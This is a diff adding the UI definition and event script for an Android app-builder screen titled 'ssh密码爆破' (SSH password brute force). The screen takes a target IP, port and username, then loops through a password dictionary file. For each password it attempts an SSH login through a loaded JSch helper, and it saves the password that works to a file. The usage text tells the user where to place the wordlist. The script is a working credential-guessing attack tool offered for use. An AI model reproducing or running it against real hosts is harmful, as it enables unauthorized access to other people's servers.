@@ -1,0 +1,292 @@
+<View id="2" did="0" type="LinearLayout">
+<ppt>width=-1
+height=50dp
+orientation=horizontal
+gravity=center_vertical
+background=#3385ff</ppt>
+<event></event>
+</View>
+<View id="9" did="2" type="ImageView">
+<ppt>width=27dp
+height=27dp
+src=@chevron left914.png
+layout_marginLeft=10dp
+layout_marginRight=15dp
+BackgroundRipple=#fffefefe
+
+</ppt>
+<event><eventItme type="clicki">end()</eventItme></event>
+</View>
+<View id="10" did="2" type="TextView">
+<ppt>width=-1
+height=-2
+text=ssh密码爆破
+textColor=#ffffff
+textSize=16sp
+layout_weight=1
+textStyle=bold
+</ppt>
+<event></event>
+</View>
+<View id="22" did="0" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="1" did="22" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical
+gravity=center_horizontal</ppt>
+<event></event>
+</View>
+<View id="27" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp</ppt>
+<event></event>
+</View>
+<View id="28" did="27" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="29" did="28" type="EditText">
+<ppt>width=-1
+height=-1
+text=
+hint=请输入目标ip
+textSize=15sp
+background=#ffffffff
+layout_marginLeft=10dp
+textCursorDrawable=#FF00B2FF
+layout_marginRight=10dp
+</ppt>
+<event></event>
+</View>
+<View id="33" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp</ppt>
+<event></event>
+</View>
+<View id="34" did="33" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="35" did="34" type="EditText">
+<ppt>width=-1
+height=-1
+text=
+hint=请输入目标ssh端口
+textSize=15sp
+background=#ffffffff
+layout_marginLeft=10dp
+textCursorDrawable=#FF00B2FF
+layout_marginRight=10dp
+</ppt>
+<event></event>
+</View>
+<View id="3" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp</ppt>
+<event></event>
+</View>
+<View id="4" did="3" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="5" did="4" type="EditText">
+<ppt>width=-1
+height=-1
+text=
+hint=请输入用户名
+textSize=15sp
+background=#ffffffff
+layout_marginLeft=10dp
+textCursorDrawable=#FF00B2FF
+layout_marginRight=10dp
+</ppt>
+<event></event>
+</View>
+<View id="14" did="1" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=horizontal
+layout_marginRight=20dp
+layout_marginLeft=20dp</ppt>
+<event></event>
+</View>
+<View id="6" did="14" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginRight=5dp
+layout_marginTop=15dp
+layout_weight=1</ppt>
+<event></event>
+</View>
+<View id="7" did="6" type="LinearLayout">
+<ppt>width=-1
+height=42dp
+orientation=vertical
+gravity=center
+background=#3385ff</ppt>
+<event><eventItme type="clicki">tw("开始运行，请稍后查看")
+t()
+{
+  ug(29,"text",host)
+  ug(5,"text",user)
+  ug(35,"text",port)
+  s(0,cs)
+  fr("/storage/emulated/0/YMAZ功能盒/sshpass/pass.txt",passwd)
+  sl(passwd,"\n",password1)
+  
+  for(pwd;password1)
+  {
+    syso(pwd)
+    ufnsui()
+    {
+      us(26,"text","正在尝试密码为"+pwd)
+    }
+    javanew(sss.控制器_,sss.控制器,"String",host,"String",user,"String",pwd,"int",port)
+    javax(链接状态,sss.控制器_,sss.控制器,"canConnection")
+    fw("/storage/emulated/0/YMAZ功能盒/sshpass/pass1.txt",pwd)
+    ufnsui()
+    {
+      s(cs + "1",cs)
+      sgszl(password1,cd)
+      s(cd,zs)
+      us(38,"text",cs+"/"+zs)
+    }
+    stop(200)
+    syso(链接状态)
+    f(链接状态==true)
+    {
+      fw("/storage/emulated/0/YMAZ功能盒/sshpass/pass1.txt",pwd)
+      ufnsui()
+      {
+        us(26,"text","破解成功!密码为"+pwd)
+      }
+      break
+    }
+  }
+}
+}</eventItme></event>
+</View>
+<View id="8" did="7" type="TextView">
+<ppt>width=-2
+height=-2
+text=开始爆破
+textColor=#ffffff
+textStyle=bold
+textSize=16sp</ppt>
+<event></event>
+</View>
+<View id="23" did="7" type="CoordinatorLayout">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="36" did="14" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginRight=5dp
+layout_marginTop=15dp
+layout_weight=1</ppt>
+<event></event>
+</View>
+<View id="37" did="36" type="LinearLayout">
+<ppt>width=-1
+height=42dp
+orientation=vertical
+gravity=center
+background=#3385ff</ppt>
+<event></event>
+</View>
+<View id="38" did="37" type="TextView">
+<ppt>width=-2
+height=-2
+text=字典数量
+textColor=#ffffff
+textStyle=bold
+textSize=16sp</ppt>
+<event></event>
+</View>
+<View id="39" did="37" type="CoordinatorLayout">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="11" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=8dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp
+visibility=gone</ppt>
+<event></event>
+</View>
+<View id="21" did="11" type="VideoView">
+<ppt>width=-1
+height=-2</ppt>
+<event></event>
+</View>
+<View id="24" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=10dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=25dp</ppt>
+<event></event>
+</View>
+<View id="25" did="24" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="26" did="25" type="TextView">
+<ppt>width=-2
+height=-2
+text=使用方法:\n1.输入目标绝对路径\n2.把密码字典放进/storage/emulated/0/YMAZ功能盒/sshpass/pass.txt里面\n3.然后点击开始\n4.因写法问题导致可能会卡死，但实际上在正常运行，请不要关闭软件\n5.运行完毕后会输出正确密码在/storage/emulated/0/YMAZ功能盒/sshass/pass1.txt文件里
+layout_margin=12dp
+textIsSelectable=true
+textSize=15sp</ppt>
+<event></event>
+</View>
+<UIEventset><eventItme type="loading">uycl(true)
+loadjar("jsch.dex",dex)
+cls(dex,"com.loverzs.ssh.SSHExcuteCommandHelper",sss.控制器)
+
+fr("/storage/emulated/0/YMAZ功能盒/sshpass/pass.txt",lie)
+sl(lie,"\n",lie1)
+sgszl(lie1,cd)
+s(cd,zs)
+us(38,"text","字典总数:"+zs)</eventItme></UIEventset>
